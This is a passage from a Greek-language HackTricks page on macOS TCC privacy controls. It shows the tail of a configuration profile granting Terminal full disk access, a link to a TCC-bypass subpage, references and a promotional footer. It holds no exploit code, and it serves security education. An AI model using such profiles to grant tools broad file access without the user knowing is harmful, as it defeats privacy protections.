<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### Παρακάμψεις TCC

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## Αναφορές

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
